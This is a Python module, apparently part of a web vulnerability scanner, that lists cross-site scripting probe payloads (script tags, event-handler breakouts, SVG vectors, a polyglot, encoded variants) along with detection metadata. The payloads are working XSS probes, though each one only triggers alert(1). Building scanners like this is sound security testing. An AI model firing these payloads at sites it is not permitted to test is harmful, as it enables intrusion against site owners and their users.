"""
web/payloads/xss.py
-------------------
Cross-Site Scripting (XSS) payload library for Raven Phase 8.

Covers:
  - Basic script injection
  - Attribute escape / event handler injection
  - Tag-break injection
  - SVG / math / audio vectors
  - Template literal injection (for JS template contexts)
  - CSP bypass probes
  - Polyglots (work in multiple contexts)
  - Entity-encoded variants

IMPORTANT: A payload being REFLECTED in the response body does NOT
confirm XSS. Confirmation requires:
  1. The reflection appears in an executable HTML context (not in a comment,
     not entity-encoded, not inside a CSS value or JS string literal).
  2. The AI advisor evaluates the surrounding HTML context, not just the
     presence of the payload string.

The expected_indicator for all XSS payloads is the payload string itself
(literal reflection check). The AI advisor then decides exploitability.
"""

from __future__ import annotations

from web.payloads import PayloadContext

# ── Raw payload strings ────────────────────────────────────────────────────────

PAYLOADS: list[str] = [
    # ── Basic script tags ─────────────────────────────────────────────────────
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<script>alert(document.domain)</script>",
    # ── Attribute injection (break out of attribute value) ────────────────────
    "\" onmouseover=\"alert(1)",
    "' onmouseover='alert(1)",
    "\" onfocus=\"alert(1)\" autofocus=\"",
    "\" onerror=\"alert(1)\" src=\"x",
    # ── Tag injection (break out of tag context) ──────────────────────────────
    "\"><script>alert(1)</script>",
    "'\"><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "\">'><script>alert(1)</script>",
    # ── Image / event handler vectors ────────────────────────────────────────
    "<img src=x onerror=alert(1)>",
    "<img src='x' onerror='alert(1)'>",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    # ── SVG vectors ──────────────────────────────────────────────────────────
    "<svg onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "<svg/onload=alert(1)>",
    # ── Anchor / javascript: protocol ────────────────────────────────────────
    "<a href=\"javascript:alert(1)\">click</a>",
    "javascript:alert(1)",
    # ── Template literal / JS context injection ───────────────────────────────
    "${alert(1)}",
    "{{7*7}}",
    "#{7*7}",
    # ── Encoded variants ──────────────────────────────────────────────────────
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    # ── Polyglot ─────────────────────────────────────────────────────────────
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//",
    # ── DOM-based indicator ───────────────────────────────────────────────────
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
    # ── Data URI ─────────────────────────────────────────────────────────────
    "<object data=\"data:text/html,<script>alert(1)</script>\">",
]

# ── Rich payload metadata ──────────────────────────────────────────────────────

CONTEXTS: list[PayloadContext] = [
    PayloadContext(
        payload="<script>alert(1)</script>",
        injection_type="query_param",
        expected_indicator="<script>alert(1)</script>",
        severity="High",
        vuln_type="XSS",
    ),
    PayloadContext(
        payload="\" onmouseover=\"alert(1)",
        injection_type="query_param",
        expected_indicator="onmouseover",
        severity="High",
        vuln_type="XSS",
    ),
    PayloadContext(
        payload="\"><script>alert(1)</script>",
        injection_type="query_param",
        expected_indicator="<script>alert(1)</script>",
        severity="High",
        vuln_type="XSS",
    ),
    PayloadContext(
        payload="<img src=x onerror=alert(1)>",
        injection_type="query_param",
        expected_indicator="onerror=alert",
        severity="High",
        vuln_type="XSS",
    ),
    PayloadContext(
        payload="<svg onload=alert(1)>",
        injection_type="query_param",
        expected_indicator="onload=alert",
        severity="High",
        vuln_type="XSS",
    ),
    PayloadContext(
        payload="${alert(1)}",
        injection_type="query_param",
        expected_indicator="${alert(1)}",
        severity="Medium",
        vuln_type="XSS",
    ),
    PayloadContext(
        payload="javascript:alert(1)",
        injection_type="query_param",
        expected_indicator="javascript:alert",
        severity="High",
        vuln_type="XSS",
    ),
]
